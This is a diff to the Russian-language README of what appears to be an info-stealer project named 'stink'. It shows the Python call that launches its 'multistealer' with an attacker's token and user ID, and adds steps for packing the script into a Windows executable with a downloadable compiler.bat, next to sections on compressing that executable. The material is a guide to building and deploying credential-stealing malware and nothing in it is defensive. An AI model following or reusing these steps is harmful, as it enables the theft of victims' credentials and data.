@@ -23,7 +23,8 @@
   * [Получение айди](#Получение-айди)
 * [Создание exe](#Создание-exe)
   * [Создание исполняемого файла](#Создание-исполняемого-файла)
-  * [CMD](#CMD)
+  * [С помощью BAT](#С-помощью-BAT)
+  * [С помощью CMD](#С-помощью-CMD)
 * [Сжатие exe](#Сжатие-exe)
   * [Недостатки](#Недостатки)
   * [WinRAR](#WinRAR)
@@ -142,7 +143,12 @@ from stink.multistealer import Stealer
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 
-### CMD
+### С помощью BAT
+1. Загружаем [компилятор](https://github.com/FallenAstaroth/stink/releases/download/v1.2.1/compiler.bat).
+2. Помещаем его в одну директорию с файлом test.py.
+3. Запускаем compiler.bat.
+
+### С помощью CMD
 1. Открываем `cmd`.
 2. Прописываем команду:
 ```
